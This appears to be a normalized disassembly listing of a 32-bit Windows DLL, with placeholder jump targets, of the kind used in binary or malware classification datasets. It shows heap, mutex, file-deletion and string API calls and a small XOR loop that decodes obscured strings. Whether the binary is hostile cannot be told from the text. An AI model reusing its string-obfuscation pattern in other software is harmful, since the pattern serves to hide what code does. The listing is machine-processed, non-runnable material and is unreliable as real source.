mov [ esi + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100187af
pop ecx
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_1007f5d0
add esp 0xc
sub_1003c570
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov eax edi
or eax ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea edx [ esi + esi ]
add [ ecx ] edx
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_1003c746
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10055649
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c780
push ebp
mov ebp esp
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd0 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xcc ] eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x4c ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xc8 ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xc8 ]
jns r-xdata
lea edx [ ebp - 0xc0 ]
mov [ ebp - 0xc0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xf3
call sub_10053240
mov esi [ ebx + 0xc ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10038760
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xe
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xc0
call sub_10053240
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x4c
call sub_10053240
mov esi [ ebx + 0x4 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
push edi
call sub_10038760
test eax eax
je r-xdata
call sub_10053240
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
lea edx [ ebp - 0x14 ]
mov eax 0x11b
call sub_10053240
mov esi [ ebx + 0x8 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xf7
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x4e
call sub_10053240
mov esi [ ebx + 0x10 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10038760
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x48
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xc4 ] eax
lea eax [ ebp - 0xc4 ]
push eax
push 0x0
push 0x80000000
push ecx
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x9d
call sub_10053240
mov esi [ ebp - 0xc4 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc4 ] eax
mov ecx [ ebp - 0xc4 ]
push ecx
call [ SysFreeString@IAT ]
mov edx [ ebp - 0xd0 ]
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0xcc ]
push edx
mov edx [ ebp - 0xc8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xcc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x12f
call sub_10053240
lea edx [ ebp - 0xbc ]
mov eax 0xfe
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xcc ] 0x0
jmp r-xdata
sub_1003ca60
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x620 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x418 ]
call sub_1006fd40
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
lea ebx [ ebp - 0x828 ]
call sub_10030e90
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov ecx [ edi + 0x14 ]
mov edi [ edi ]
xor ebx ebx
xor esi esi
xor eax eax
mov [ ebp - 0x830 ] dl
cmp edi ebx
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ecx
push eax
mov eax [ ebp - 0x830 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x82c ]
lea edx [ ebp - 0x418 ]
push edx
lea eax [ ebp - 0x620 ]
push eax
lea edx [ ebp - 0x828 ]
call sub_1006a930
test eax eax
jne r-xdata
mov eax edi
mov eax [ rw-data ]
mov ecx [ eax + 0xf4 ]
push ecx
mov [ eax + 0xe8 ] ebx
mov [ eax + 0xf0 ] ebx
mov [ eax + 0xec ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_1003cbb0
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1004091d
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1003cbd5
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10068101
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1003cc03
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1001da0a
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_100699c1
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_1005c227
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003ccb0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002dff0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1003ccd1
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_10035d06
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1003cd30
push ebp
mov ebp esp
push 0xffffffff
push sub_10086c60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x88 ] ecx
cmp eax ebx
jne r-xdata
mov ecx [ ecx ]
push ecx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10037e00
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x1c ]
cmp eax 0xe
jae r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov esi 0x3
cmp eax esi
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov esi eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
push eax
push r--data
push ecx
call sub_1002b290
add esp 0xc
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp edi 0x10
jb r-xdata
cmp esi 0x3
jb r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
xor eax eax
cmp esi 0x3
setne al
cmp eax ebx
je r-xdata
push 0x8
push 0x3
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x84 ] ebx
call sub_10062d50
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10057800
add esp 0xc
mov esi 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
cmp [ ebp - 0x34 ] esi
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x84 ]
push edx
push 0x1
push eax
call [ StrToIntExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push 0x3
push 0xb
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100075f0
mov ebx eax
push 0x3
lea eax [ ebx + 0x4 ]
push eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100075f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x4
jmp r-xdata
push 0x4
add esi 0x3
push esi
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100075f0
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x5
jmp r-xdata
cmp eax esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x6
jmp r-xdata
sub eax esi
mov edi eax
push edi
push esi
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10062d50
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x80 ]
mov esi 0x10
cmp [ ebp - 0x6c ] esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x7
jmp r-xdata
mov edx edi
call sub_10047d50
cmp eax [ ebp - 0x84 ]
je r-xdata
lea ecx [ ebp - 0x80 ]
cmp ebx 0xb
je r-xdata
lea ecx [ ebp - 0x80 ]
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x80 ]
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
xor eax eax
add ebx 0xfffffff5
push ebx
push 0xb
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_10062d50
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call sub_100605d0
mov ecx [ ebp - 0x88 ]
mov [ ecx ] eax
add esp 0x4
lea ecx [ ebp - 0x64 ]
call sub_1004c8c0
mov eax [ eax ]
sub_1003d000
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a53f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x400 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
mov [ esp + 0x14 ] ebx
cmp [ ebx + 0x8 ] edi
jne r-xdata
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x408 ] edi
lea eax [ esp + 0xc8 ]
mov ecx ebx
lea esi [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xcc ] edi
mov [ esp + 0xd0 ] edi
call sub_1004adb0
mov [ esp + 0x408 ] 0x1
mov esi [ esp + 0xc8 ]
cmp esi edi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x19c ]
mov eax 0x59
call sub_10045930
mov eax edx
push eax
lea ecx [ esp + 0x94 ]
add ebx 0xc
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x2
call sub_100205a0
mov [ esp + 0x408 ] 0x1
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0xcc ]
push eax
lea ecx [ esp + 0xd8 ]
push ecx
push edx
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
mov ecx [ esp + 0x400 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e8 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x34 ]
lea edi [ esp + 0x24 ]
call sub_10046560
test eax eax
je r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x2c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x137
call sub_10045930
push edx
lea eax [ esp + 0x94 ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x3
call sub_100205a0
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
lea edx [ esp + 0x30 ]
mov eax 0x46
call sub_10045930
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x204 ]
mov [ esp + 0x2c ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_1005c3d0
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
push edx
push eax
lea eax [ esp + 0x1f4 ]
call sub_10005c30
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x4
call sub_100205a0
lea ecx [ esp + 0xac ]
call sub_10019100
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
lea esi [ esp + 0x1c ]
call sub_1006a530
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp edi esi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov edi edi
lea edx [ esp + 0xc8 ]
mov eax 0x3b
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x94 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x5
call sub_100205a0
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
jmp r-xdata
lea eax [ esp + 0x1ec ]
push eax
call sub_1004cc40
mov esi eax
test esi esi
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xb0 ]
call sub_10045cc0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0x94 ]
push eax
mov [ esp + 0x410 ] 0x6
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x408 ] 0x7
call sub_10057920
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x2 ]
mov [ esp + 0x408 ] bl
call sub_100205a0
cmp [ esp + 0xdc ] ebx
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_100187af
add esp 0x4
jmp r-xdata
mov eax [ edi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi esi
jne r-xdata
lea eax [ esp + 0x1ec ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x170 ]
mov eax 0x3b
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0xc
call sub_100205a0
cmp [ esp + 0xc0 ] 0x8
jb r-xdata
lea ecx [ esp + 0x1ec ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xb0 ]
call sub_10045cc0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x410 ] 0x9
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0x90 ]
mov [ esp + 0x408 ] 0xa
call sub_10057920
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0xb
call sub_100205a0
mov esi 0x8
cmp [ esp + 0xa4 ] esi
jb r-xdata
xor edi edi
xor edx edx
mov esi 0x7
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] dx
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0xc8 ]
push ecx
call sub_100187af
add esp 0x4
xor eax eax
mov edi esi
mov eax ebx
call sub_100699f0
push ebx
call sub_100187af
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esp + 0xac ]
push eax
call sub_100187af
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x7
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] edi
mov [ esp + 0x90 ] cx
cmp [ esp + 0xc0 ] ebx
jb r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x1c ]
cmp esi edi
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_100187af
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] bl
call sub_1001f5f0
mov esi [ esp + 0x1c ]
cmp esi ebx
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
sub_1003d6e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
add eax ecx
mov [ esi + 0x8 ] eax
mov eax 0x1
xor edx edx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] edx
mov [ esi + 0x1c ] edx
mov [ esi + 0x2c ] eax
cmp ecx edx
je r-xdata
mov [ esi + 0xc ] 0xffffffff
pop esi
pop ebp
retn
call sub_1007e670
pop esi
pop ebp
retn
sub_1003d730
push ebp
mov ebp esp
push 0xffffffff
push sub_10088b88
mov eax [ fs : 0x0 ]
push eax
sub esp 0x178
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov edi [ StrStrW@IAT ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x174 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x168 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x170 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x178 ] edx
mov edx [ ebp + 0x20 ]
push eax
mov eax [ esi ]
mov [ ebp - 0x16c ] ecx
mov ecx [ ebp + 0x24 ]
